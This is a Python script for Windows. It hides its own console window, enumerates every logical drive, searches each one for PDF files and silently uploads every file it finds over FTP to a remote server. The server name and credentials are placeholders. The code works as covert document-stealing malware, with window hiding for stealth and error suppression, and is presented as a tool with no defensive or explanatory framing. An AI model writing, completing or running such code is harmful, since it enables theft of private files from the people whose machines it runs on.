from os.path import join, splitext
from os import walk, popen
import os
import sys
import ftplib
from ftplib import FTP, error_perm
import shutil
import win32gui, win32con

The_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(The_program_to_hide , win32con.SW_HIDE)

lookfor = [".pdf"]

def get_drives():
    response = popen("wmic logicaldisk get caption")
    list1 = []
    for line in response.readlines():
        line = line.strip("\n")
        line = line.strip("\r")
        line = line.strip(" ")
        if (line == "Caption" or line == ""):
            continue
        list1.append(line)
    return list1

def search_file(drive):
    for root, dirs, files in walk(drive):
        for file in files:
            if file.endswith('.pdf'):
                hello = join(root, file)
                try:
                    session = ftplib.FTP('SERVER NAME','SERVER ID','SERVER PASSWORD')
                    file2 = open(hello,'rb')
                    session.storbinary('STOR %s' %file, file2)
                    file2.close()
                    session.quit()
                except ftplib.error_perm:
                    pass
                    #print ("Error: ",sys.exc_info()[0])

if __name__ == '__main__':
    try:
        drives = get_drives()
        for drive in drives:
            search_file(drive + '\\\\')
    except:
        print ("Error: ",sys.exc_info()[0])
